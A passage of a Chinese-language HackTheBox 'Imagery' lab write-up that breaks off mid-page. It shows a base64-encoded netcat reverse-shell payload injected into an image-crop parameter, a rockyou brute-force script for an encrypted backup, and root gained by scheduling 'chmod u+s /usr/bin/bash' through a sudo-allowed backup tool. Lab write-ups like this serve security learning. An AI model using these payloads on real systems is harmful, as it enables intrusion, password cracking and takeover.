class="hljs-string">&quot;e434c998-d7a2-4a95-8465-051761cf56df&quot;</span>,<span class="hljs-string">&quot;transformType&quot;</span>:<span class="hljs-string">&quot;crop&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:&#123;<span class="hljs-string">&quot;x&quot;</span>:<span class="hljs-string">&quot;;printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxMC4xMC4xNC4yIDQ0NDQgPi90bXAvXykgJg==|base64 -d|sh;&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;width&quot;</span>:<span class="hljs-number">24</span>,<span class="hljs-string">&quot;height&quot;</span>:<span class="hljs-number">24</span>&#125;&#125;<br><span class="hljs-operator">────────────────────────────────────────────────────────────────────────────────</span><br><span class="hljs-operator">➤</span>  🏠 <span class="hljs-type">Main</span> <span class="hljs-type">Menu</span> (m) 💀 <span class="hljs-type">Payloads</span> (p) 🔄 <span class="hljs-type">Clear</span> (<span class="hljs-type">Ctrl</span><span class="hljs-operator">-</span><span class="hljs-type">L</span>) 🚫 <span class="hljs-type">Quit</span> (q<span class="hljs-operator">/</span><span class="hljs-type">Ctrl</span><span class="hljs-operator">-</span><span class="hljs-type">C</span>)<br>[<span class="hljs-operator">+</span>] <span class="hljs-type">Got</span> reverse shell from <span class="hljs-type">Imagery</span><span class="hljs-operator">-</span><span class="hljs-number">10.129</span>.<span class="hljs-number">23.190</span><span class="hljs-operator">-</span><span class="hljs-type">Linux</span><span class="hljs-operator">-</span>x86_64 😍 <span class="hljs-type">Assigned</span> <span class="hljs-type">SessionID</span> <span class="hljs-operator">&lt;</span><span class="hljs-number">1</span><span class="hljs-operator">&gt;</span><br>[<span class="hljs-operator">+</span>] <span class="hljs-type">Attempting</span> to upgrade shell to <span class="hljs-type">PTY</span>...<br>[<span class="hljs-operator">+</span>] <span class="hljs-type">Shell</span> upgraded successfully using <span class="hljs-regexp">/home/</span>web<span class="hljs-regexp">/web/</span>env<span class="hljs-regexp">/bin/</span>python3<span class="hljs-operator">!</span> 💪<br>[<span class="hljs-operator">+</span>] <span class="hljs-type">Interacting</span> with session [<span class="hljs-number">1</span>], <span class="hljs-type">Shell</span> <span class="hljs-type">Type</span>: <span class="hljs-type">PTY</span>, <span class="hljs-type">Menu</span> key: <span class="hljs-type">F12</span> <br>[<span class="hljs-operator">+</span>] <span class="hljs-type">Logging</span> to <span class="hljs-regexp">/root/</span>.penelope<span class="hljs-regexp">/Imagery~10.129.23.190_Linux_x86_64/</span><span class="hljs-number">2025_11_19</span><span class="hljs-operator">-</span><span class="hljs-number">20_09_13</span><span class="hljs-operator">-</span><span class="hljs-number">910</span>.log 📜<br><span class="hljs-operator">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br>web<span class="hljs-meta">@Imagery</span>:<span class="hljs-operator">~/</span>web$ id<br>uid<span class="hljs-operator">=</span><span class="hljs-number">1001</span>(web) gid<span class="hljs-operator">=</span><span class="hljs-number">1001</span>(web) groups<span class="hljs-operator">=</span><span class="hljs-number">1001</span>(web)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="GetMark"><a href="#GetMark" class="headerlink" title="GetMark"></a>GetMark</h3><hr>
+<p>扒拉文件找到一个备份文件。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">web<span class="hljs-variable">@Imagery</span><span class="hljs-symbol">:/var/backup</span><span class="hljs-variable">$ </span>ls<br>web_20250806_120723.zip.aes<br></code></pre></td></tr></table></figure>
+
+<p>下载到自己的kali上，使用脚本爆破密码</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim">#!/usr/bin/env <span class="hljs-keyword">python3</span><br>import pyAesCrypt<br><br>wordlist = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>infile = <span class="hljs-string">&#x27;web_20250806_120723.zip.aes&#x27;</span><br><span class="hljs-keyword">buffer</span> = <span class="hljs-number">64</span> * <span class="hljs-number">1024</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> in wordlist:<br>    password = <span class="hljs-built_in">line</span>.strip().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        pyAesCrypt.decryptFile(infile, <span class="hljs-string">&#x27;output.zip&#x27;</span>, password, <span class="hljs-keyword">buffer</span>)<br>        <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">&quot;[+] Password found: &#123;password&#125;&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    except ValueError:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>
+
+<p>密码为bestfriends</p>
+<p>之后压缩包里有一个db.json，里面有mark的密码哈希</p>
+<p>爆破得到密码</p>
+<p><img src="/2025/11/20/HackTheBox-Imagery/msedge_vQTk8tFsG3.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mark<span class="hljs-variable">@Imagery</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> mark on <span class="hljs-symbol">Imagery:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>, use_pty<br><br><span class="hljs-title class_">User</span> mark may run the following commands on <span class="hljs-symbol">Imagery:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/local/bin/charcol<br><br></code></pre></td></tr></table></figure>
+
+<p>这里要先把这个东西的密码重置了。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mark@Imagery:~$ sudo /usr/local/bin/charcol -R<br><br>Attempting <span class="hljs-keyword">to</span> reset Charcol application password <span class="hljs-keyword">to</span> default.<br>[2025-11-20 01:23:42] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verification required <span class="hljs-keyword">for</span> this operation.<br>Enter<span class="hljs-built_in"> system </span>password <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">&#x27;mark&#x27;</span> <span class="hljs-keyword">to</span> confirm: <br><br>[2025-11-20 01:23:55] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verified successfully.<br>Removed existing<span class="hljs-built_in"> config </span>file: /root/.charcol/.charcol_config<br>Charcol application password has been reset <span class="hljs-keyword">to</span><span class="hljs-built_in"> default </span>(<span class="hljs-literal">no</span> password mode).<br>Please restart the application <span class="hljs-keyword">for</span> changes <span class="hljs-keyword">to</span> take effect.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs vim">mark@Imagery:~$ sudo /usr/local/bin/charcol <span class="hljs-keyword">shell</span><br><br>  ░██████  ░██                                                  ░██ <br> ░██   ░░██ ░██                                                  ░██ <br>░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ <br>░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ <br>░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ <br> ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ <br>  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ <br>                                                                    <br>                                                                    <br>                                                                    <br>Charcol The Backup Suit - Development edition <span class="hljs-number">1.0</span>.<span class="hljs-number">0</span><br><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">43</span>] [INFO] Entering Charcol interactive <span class="hljs-keyword">shell</span>. Type <span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> commands, <span class="hljs-string">&#x27;exit&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">quit</span>.<br>charcol&gt; <span class="hljs-keyword">help</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span>] [INFO] <br>Charcol Shell Commands:<br><br>  Backup &amp; Fetch:<br>    backup -i &lt;paths...&gt; [-<span class="hljs-keyword">o</span> <span class="hljs-symbol">&lt;output_file&gt;</span>] [-<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span>] [-<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;level&gt;</span>] [--<span class="hljs-built_in">type</span> <span class="hljs-symbol">&lt;archive_type&gt;</span>] [-<span class="hljs-keyword">e</span> &lt;patterns...&gt;] [--<span class="hljs-keyword">no</span>-timestamp] [-<span class="hljs-keyword">f</span>] [--skip-symlinks] [--ask-password]<br>      Purpose: Create <span class="hljs-keyword">an</span> encrypted backup archive from specified <span class="hljs-keyword">files</span>/directories.<br>      Output: File will have <span class="hljs-keyword">a</span> <span class="hljs-string">&#x27;.aes&#x27;</span> extension <span class="hljs-keyword">if</span> encrypted. Defaults <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/var/backup/&#x27;</span>.<br>      Naming: Automatically adds timestamp unless --<span class="hljs-keyword">no</span>-timestamp <span class="hljs-keyword">is</span> used. If <span class="hljs-keyword">no</span> -<span class="hljs-keyword">o</span>, uses <span class="hljs-built_in">input</span> filename <span class="hljs-keyword">as</span> base.<br>      Permissions: Files created with <span class="hljs-number">664</span> permissions. Ownership <span class="hljs-keyword">is</span> user:group.<br>      Encryption:<br>        - If <span class="hljs-string">&#x27;--app-password&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> (status <span class="hljs-number">1</span>) <span class="hljs-built_in">and</span> <span class="hljs-keyword">no</span> <span class="hljs-string">&#x27;-p &lt;file_password&gt;&#x27;</span> <span class="hljs-keyword">is</span> given, uses the application password <span class="hljs-keyword">for</span> encryption.<br>        - If <span class="hljs-string">&#x27;no password&#x27;</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> (status <span class="hljs-number">2</span>) <span class="hljs-built_in">and</span> <span class="hljs-keyword">no</span> <span class="hljs-string">&#x27;-p &lt;file_password&gt;&#x27;</span> <span class="hljs-keyword">is</span> given, creates <span class="hljs-keyword">an</span> UNENCRYPTED archive.<br>      Examples:<br>        - Encrypted with <span class="hljs-keyword">file</span>-specific password:<br>          backup -i /home/user/my_docs /var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span> -<span class="hljs-keyword">o</span> /tmp/web_logs -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span> --<span class="hljs-keyword">verbose</span> --<span class="hljs-built_in">type</span> tar.gz -<span class="hljs-keyword">c</span> <span class="hljs-number">9</span><br>        - Encrypted with app password (<span class="hljs-keyword">if</span> status <span class="hljs-number">1</span>):<br>          backup -i /home/user/example_file.json<br>        - Unencrypted (<span class="hljs-keyword">if</span> status <span class="hljs-number">2</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">no</span> -<span class="hljs-keyword">p</span>):<br>          backup -i /home/user/example_file.json<br>        - No timestamp:<br>          backup -i /home/user/example_file.json --<span class="hljs-keyword">no</span>-timestamp<br><br>    fetch <span class="hljs-symbol">&lt;url&gt;</span> [-<span class="hljs-keyword">o</span> <span class="hljs-symbol">&lt;output_file&gt;</span>] [-<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span>] [-<span class="hljs-keyword">f</span>] [--ask-password]<br>      Purpose: Download <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> from <span class="hljs-keyword">a</span> URL, encrypt it, <span class="hljs-built_in">and</span> save it.<br>      Output: File will have <span class="hljs-keyword">a</span> <span class="hljs-string">&#x27;.aes&#x27;</span> extension <span class="hljs-keyword">if</span> encrypted. Defaults <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/var/backup/fetched_file&#x27;</span>.<br>      Permissions: Files created with <span class="hljs-number">664</span> permissions. Ownership <span class="hljs-keyword">is</span> current user:group.<br>      Restrictions: Fetching from loopback addresses (<span class="hljs-keyword">e</span>.g., localhost, <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>) <span class="hljs-keyword">is</span> blocked.<br>      Encryption:<br>        - If <span class="hljs-string">&#x27;--app-password&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> (status <span class="hljs-number">1</span>) <span class="hljs-built_in">and</span> <span class="hljs-keyword">no</span> <span class="hljs-string">&#x27;-p &lt;file_password&gt;&#x27;</span> <span class="hljs-keyword">is</span> given, uses the application password <span class="hljs-keyword">for</span> encryption.<br>        - If <span class="hljs-string">&#x27;no password&#x27;</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> (status <span class="hljs-number">2</span>) <span class="hljs-built_in">and</span> <span class="hljs-keyword">no</span> <span class="hljs-string">&#x27;-p &lt;file_password&gt;&#x27;</span> <span class="hljs-keyword">is</span> given, creates <span class="hljs-keyword">an</span> UNENCRYPTED <span class="hljs-keyword">file</span>.<br>      Examples:<br>        - Encrypted:<br>          fetch <span class="hljs-symbol">&lt;URL&gt;</span> -<span class="hljs-keyword">o</span> <span class="hljs-symbol">&lt;output_file_path&gt;</span> -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span> --force<br>        - Unencrypted (<span class="hljs-keyword">if</span> status <span class="hljs-number">2</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">no</span> -<span class="hljs-keyword">p</span>):<br>          fetch <span class="hljs-symbol">&lt;URL&gt;</span> -<span class="hljs-keyword">o</span> <span class="hljs-symbol">&lt;output_file_path&gt;</span><br><br>  Integrity &amp; Extraction:<br>    <span class="hljs-keyword">list</span> <span class="hljs-symbol">&lt;encrypted_file&gt;</span> [-<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span>] [--ask-password]<br>      Purpose: Decrypt <span class="hljs-built_in">and</span> <span class="hljs-keyword">list</span> contents of <span class="hljs-keyword">an</span> encrypted Charcol archive.<br>      Note: Requires the correct decryption password.<br>      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.<br>      Example:<br>        <span class="hljs-keyword">list</span> /var/backup/<span class="hljs-symbol">&lt;encrypted_file_name&gt;</span>.zip.aes -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span><br><br>    check <span class="hljs-symbol">&lt;encrypted_file&gt;</span> [-<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span>] [--ask-password]<br>      Purpose: Decrypt <span class="hljs-built_in">and</span> verify the structural integrity of <span class="hljs-keyword">an</span> encrypted Charcol archive.<br>      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.<br>      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.<br>      Example:<br>        check /var/backup/<span class="hljs-symbol">&lt;encrypted_file_name&gt;</span>.tar.gz.aes -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span><br><br>    extract <span class="hljs-symbol">&lt;encrypted_file&gt;</span> <span class="hljs-symbol">&lt;output_directory&gt;</span> [-<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span>] [--ask-password]<br>      Purpose: Decrypt <span class="hljs-keyword">an</span> encrypted Charcol archive <span class="hljs-built_in">and</span> extract its contents.<br>      Note: Requires the correct decryption password.<br>      Example:<br>        extract /var/backup/<span class="hljs-symbol">&lt;encrypted_file_name&gt;</span>.zip.aes /tmp/restored_data -<span class="hljs-keyword">p</span> <span class="hljs-symbol">&lt;file_password&gt;</span><br><br>  Automated Jobs (Cron):<br>    auto <span class="hljs-built_in">add</span> --schedule <span class="hljs-string">&quot;&lt;cron_schedule&gt;&quot;</span> --<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;&lt;shell_command&gt;&quot;</span> --name <span class="hljs-string">&quot;&lt;job_name&gt;&quot;</span> [--<span class="hljs-built_in">log</span>-output <span class="hljs-symbol">&lt;log_file&gt;</span>]<br>      Purpose: Add <span class="hljs-keyword">a</span> <span class="hljs-keyword">new</span> automated cron job managed by Charcol.<br>      Verification:<br>        - If <span class="hljs-string">&#x27;--app-password&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> (status <span class="hljs-number">1</span>): Requires Charcol application password (via <span class="hljs-keyword">global</span> --app-password flag).<br>        - If <span class="hljs-string">&#x27;no password&#x27;</span> <span class="hljs-keyword">mode</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">set</span> (status <span class="hljs-number">2</span>): Requires <span class="hljs-built_in">system</span> password verification (in interactive <span class="hljs-keyword">shell</span>).<br>      Security Warning: Charcol does NOT validate the safety of the --<span class="hljs-keyword">command</span>. Use absolute paths.<br>      Examples:<br>        - Status <span class="hljs-number">1</span> (encrypted app password), cron:<br>          CHARCOL_NON_INTERACTIVE=true charcol --app-password <span class="hljs-symbol">&lt;app_password&gt;</span> auto <span class="hljs-built_in">add</span> \<br>          --schedule <span class="hljs-string">&quot;0 2 * * *&quot;</span> --<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;charcol backup -i /home/user/docs -p &lt;file_password&gt;&quot;</span> \<br>          --name <span class="hljs-string">&quot;Daily Docs Backup&quot;</span> --<span class="hljs-built_in">log</span>-output <span class="hljs-symbol">&lt;log_file_path&gt;</span><br>        - Status <span class="hljs-number">2</span> (<span class="hljs-keyword">no</span> app password), cron, unencrypted backup:<br>          CHARCOL_NON_INTERACTIVE=true charcol auto <span class="hljs-built_in">add</span> \<br>          --schedule <span class="hljs-string">&quot;0 2 * * *&quot;</span> --<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;charcol backup -i /home/user/docs&quot;</span> \<br>          --name <span class="hljs-string">&quot;Daily Docs Backup&quot;</span> --<span class="hljs-built_in">log</span>-output <span class="hljs-symbol">&lt;log_file_path&gt;</span><br>        - Status <span class="hljs-number">2</span> (<span class="hljs-keyword">no</span> app password), interactive:<br>          auto <span class="hljs-built_in">add</span> --schedule <span class="hljs-string">&quot;0 2 * * *&quot;</span> --<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;charcol backup -i /home/user/docs&quot;</span> \<br>          --name <span class="hljs-string">&quot;Daily Docs Backup&quot;</span> --<span class="hljs-built_in">log</span>-output <span class="hljs-symbol">&lt;log_file_path&gt;</span><br>          (will prompt <span class="hljs-keyword">for</span> <span class="hljs-built_in">system</span> password)<br><br>    auto <span class="hljs-keyword">list</span><br>      Purpose: List <span class="hljs-keyword">all</span> automated jobs managed by Charcol.<br>      Example:<br>        auto <span class="hljs-keyword">list</span><br><br>    auto <span class="hljs-keyword">edit</span> <span class="hljs-symbol">&lt;job_id&gt;</span> [--schedule <span class="hljs-string">&quot;&lt;new_schedule&gt;&quot;</span>] [--<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;&lt;new_command&gt;&quot;</span>] [--name <span class="hljs-string">&quot;&lt;new_name&gt;&quot;</span>] [--<span class="hljs-built_in">log</span>-output <span class="hljs-symbol">&lt;new_log_file&gt;</span>]<br>      Purpose: Modify <span class="hljs-keyword">an</span> existing Charcol-managed automated job.<br>      Verification: Same <span class="hljs-keyword">as</span> <span class="hljs-string">&#x27;auto add&#x27;</span>.<br>      Example:<br>        auto <span class="hljs-keyword">edit</span> <span class="hljs-symbol">&lt;job_id&gt;</span> --schedule <span class="hljs-string">&quot;30 4 * * *&quot;</span> --name <span class="hljs-string">&quot;Updated Backup Job&quot;</span><br><br>    auto <span class="hljs-keyword">delete</span> <span class="hljs-symbol">&lt;job_id&gt;</span><br>      Purpose: Remove <span class="hljs-keyword">an</span> automated job managed by Charcol.<br>      Verification: Same <span class="hljs-keyword">as</span> <span class="hljs-string">&#x27;auto add&#x27;</span>.<br>      Example:<br>        auto <span class="hljs-keyword">delete</span> <span class="hljs-symbol">&lt;job_id&gt;</span><br><br>  Shell &amp; Help:<br>    <span class="hljs-keyword">shell</span><br>      Purpose: Enter this interactive Charcol <span class="hljs-keyword">shell</span>.<br>      Example:<br>        <span class="hljs-keyword">shell</span><br><br>    <span class="hljs-keyword">exit</span><br>      Purpose: Exit the Charcol <span class="hljs-keyword">shell</span>.<br>      Example:<br>        <span class="hljs-keyword">exit</span><br><br>    clear<br>      Purpose: Clear the interactive <span class="hljs-keyword">shell</span> screen.<br>      Example:<br>        clear<br><br>    <span class="hljs-keyword">help</span> [<span class="hljs-keyword">command</span>]<br>      Purpose: Show <span class="hljs-keyword">help</span> <span class="hljs-keyword">for</span> Charcol <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> specific <span class="hljs-keyword">command</span>.<br>      Example:<br>        <span class="hljs-keyword">help</span> backup<br><br>Global Flags (apply <span class="hljs-keyword">to</span> <span class="hljs-keyword">all</span> commands unless overridden):<br>  --app-password <span class="hljs-symbol">&lt;password&gt;</span>    : Provide the Charcol *application password* directly. Required <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;auto&#x27;</span> commands <span class="hljs-keyword">if</span> status <span class="hljs-number">1</span>. Less secure than interactive prompt.<br>  -<span class="hljs-keyword">p</span>, <span class="hljs-string">&quot;--password&quot;</span> <span class="hljs-symbol">&lt;password&gt;</span>    : Provide the *<span class="hljs-keyword">file</span> encryption/decryption password* directly. Overrides application password <span class="hljs-keyword">for</span> <span class="hljs-keyword">file</span> operations. Less secure than --ask-password.<br>  -v, <span class="hljs-string">&quot;--verbose&quot;</span>                : Enable <span class="hljs-keyword">verbose</span> output.<br>  --quiet                      : Suppress informational output (show <span class="hljs-keyword">only</span> warnings <span class="hljs-built_in">and</span> errors).<br>  --<span class="hljs-built_in">log</span>-<span class="hljs-keyword">file</span> <span class="hljs-symbol">&lt;path&gt;</span>            : Log <span class="hljs-keyword">all</span> output <span class="hljs-keyword">to</span> <span class="hljs-keyword">a</span> specified <span class="hljs-keyword">file</span>.<br>  --dry-run                    : Simulate actions without actual <span class="hljs-keyword">file</span> <span class="hljs-keyword">changes</span> (<span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;backup&#x27;</span> <span class="hljs-built_in">and</span> <span class="hljs-string">&#x27;fetch&#x27;</span>).<br>  --ask-password               : Prompt <span class="hljs-keyword">for</span> the *<span class="hljs-keyword">file</span> encryption/decryption password* securely. Overrides -<span class="hljs-keyword">p</span> <span class="hljs-built_in">and</span> application password <span class="hljs-keyword">for</span> <span class="hljs-keyword">file</span> operations.<br>  --<span class="hljs-keyword">no</span>-banner                   : Do not <span class="hljs-keyword">display</span> the ASCII banner.<br>  -R, <span class="hljs-string">&quot;--reset-password-to-default&quot;</span>  : Reset application password <span class="hljs-keyword">to</span> default (requires <span class="hljs-built_in">system</span> password verification).<br></code></pre></td></tr></table></figure>
+
+<p>写一个定时任务chmod u+s就行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mark@Imagery:~$ sudo /usr/local/bin/charcol shell<br><br>  ░██████  ░██                                                  ░██ <br> ░██   ░░██ ░██                                                  ░██ <br>░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ <br>░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ <br>░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ <br> ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ <br>  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ <br>                                                                    <br>                                                                    <br>                                                                    <br>Charcol The Backup Suit - Development edition 1.0.0<br><br>[2025-11-20 01:30:30] [<span class="hljs-built_in">INFO</span>] Entering Charcol interactive shell.<span class="hljs-built_in"> Type </span><span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> commands, <span class="hljs-string">&#x27;exit&#x27;</span> <span class="hljs-keyword">to</span> quit.<br>charcol&gt; auto <span class="hljs-built_in">add</span> --schedule <span class="hljs-string">&quot;asd&quot;</span> --command <span class="hljs-string">&quot;chmod u+s /usr/bin/bash&quot;</span> --name <span class="hljs-string">&quot;bash&quot;</span><br>[2025-11-20 01:30:37] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verification required <span class="hljs-keyword">for</span> this operation.<br>Enter<span class="hljs-built_in"> system </span>password <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">&#x27;mark&#x27;</span> <span 